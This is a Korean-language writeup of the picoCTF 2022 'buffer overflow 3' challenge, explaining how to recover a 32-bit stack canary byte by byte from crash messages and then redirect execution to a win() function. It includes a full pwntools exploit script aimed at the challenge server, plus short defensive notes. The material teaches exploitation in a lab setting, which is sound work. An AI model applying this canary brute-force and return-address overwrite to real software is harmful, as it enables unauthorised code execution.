---
title: buffer overflow 3 — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-15
type: query
tags: [ctf, pwn, stack-canary, brute-force, buffer-overflow, win-function, picoctf]
sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/buffer-overflow-3, https://qiita.com/housu_jp/items/f6b9e0dedf555f7288ce, https://cryptocat.me/blog/ctf/2022/pico/pwn/buffer_overflow_3/]
confidence: high
---

# buffer overflow 3 — picoCTF 2022 pwn writeup

> `buffer overflow 3`는 **스택 카나리를 byte-by-byte로 맞춰가며 brute force한 뒤, 리턴 주소를 `win()`으로 바꾸는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **canary leak 없이도 가능한 반응 기반 brute force**입니다.

## 1. 핵심 요약

- 바이너리는 32-bit x86입니다.
- `BUFSIZE=64`, `CANARY_SIZE=4`입니다.
- 입력 길이를 직접 지정할 수 있어서, 특정 지점까지만 덮어볼 수 있습니다.
- 카나리는 **정적 값**이며, 프로세스 한 인스턴스 내에서는 유지됩니다.
- 마지막에는 카나리를 보존한 채 리턴 주소를 `win()`으로 덮습니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / stack canary / brute force |
| 아키텍처 | 32-bit x86 |
| 핵심 요소 | canary brute force, ret2win |
| 오프셋 | 버퍼 뒤 canary 4바이트, 그 뒤 saved EIP |
| 목표 | `win()` 호출 |

## 3. 공격 흐름

1. 입력 길이를 짧게 잡아 카나리 한 바이트만 시험합니다.
2. 프로그램이 `***** Stack Smashing Detected *****`를 내는지 확인합니다.
3. 맞는 바이트만 누적해서 카나리를 완성합니다.
4. 완성된 카나리 뒤에 saved EBP 자리와 `win()` 주소를 붙입니다.
5. `win()`이 flag를 읽고 출력합니다.

## 4. 왜 가능한가

카나리는 원래 버퍼 오버플로를 막기 위한 방어입니다. 하지만 이 문제처럼 **실패 여부가 명확히 구분되는 경우**에는, 카나리를 한 바이트씩 맞춰 보는 방식으로 우회할 수 있습니다. 특히 32-bit 환경에서는 카나리 크기가 4바이트라 brute force의 난도가 상대적으로 낮습니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln')  # 바이너리를 로드합니다.

# 로컬/원격 실행을 선택하는 헬퍼입니다.
def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 57032)  # 원격 서비스 예시입니다.
    return process(elf.path)  # 로컬에서 실행합니다.

io = start()

canary = b''  # 복구할 카나리 바이트들입니다.

# 카나리를 byte-by-byte로 맞춰봅니다.
for i in range(4):
    for b in range(256):
        trial = canary + bytes([b])
        payload = flat(
            b'A' * 64,   # 버퍼를 먼저 채웁니다.
            trial,       # 지금까지의 카나리 후보를 넣습니다.
            b'B' * 4,    # saved EBP 자리입니다.
            p32(elf.symbols['win'])  # 최종 목적지입니다.
        )
        io = start()
        io.sendlineafter(b'> ', b'88')      # 예시: 충분한 길이로 읽게 합니다.
        io.sendafter(b'Input> ', payload)   # 예시: 카나리 검증을 통과하는지 확인합니다.
        out = io.recvall(timeout=0.2)
        if b'Stack Smashing Detected' not in out:
            canary = trial
            print(f'[+] canary byte {i}: {b:02x}')
            break

# 실제로는 완성된 canary 뒤에 ret2win payload를 보냅니다.
payload = flat(
    b'A' * 64,        # buffer
    canary,           # recovered canary
    b'B' * 4,         # saved EBP
    p32(elf.symbols['win'])  # return to win
)

io = start()
io.sendlineafter(b'> ', b'88')
io.sendafter(b'Input> ', payload)
io.interactive()  # flag 출력 확인
```

## 6. 방어 관점 메모

- 에러 메시지나 크래시 여부만으로도 카나리 복원이 가능하면 위험합니다.
- 카나리 자체보다 **오류 반응 채널**을 막는 것이 중요합니다.
- 길이 제한과 입력 검증을 함께 적용해야 합니다.
- `win()` 같은 함수는 CTF에서는 의도적이지만, 실서비스에서는 이런 구조를 두면 안 됩니다.

## 7. 비교 포인트

- `x-sixty-what`은 **64-bit ret2win**입니다.
- `Stack Cache`는 **stack leak + ret2win**입니다.
- `buffer overflow 3`는 **stack canary brute force**입니다.
- `Function Overwrite`는 **function pointer overwrite**입니다.

## 8. 참고 자료

- [PicoCTF-2022 — buffer overflow 3](https://picoctf2022.haydenhousen.com/binary-exploitation/buffer-overflow-3)
- [Qiita — picoCTF 2022 buffer overflow 3 Writeup](https://qiita.com/housu_jp/items/f6b9e0dedf555f7288ce)
- [CryptoCat — PicoCTF 2022: Buffer Overflow 3](https://cryptocat.me/blog/ctf/2022/pico/pwn/buffer_overflow_3/)
- [[stack-canary-bruteforce-ctf-patterns]]
- [[ret2win-64bit-stack-alignment-ctf-patterns]]
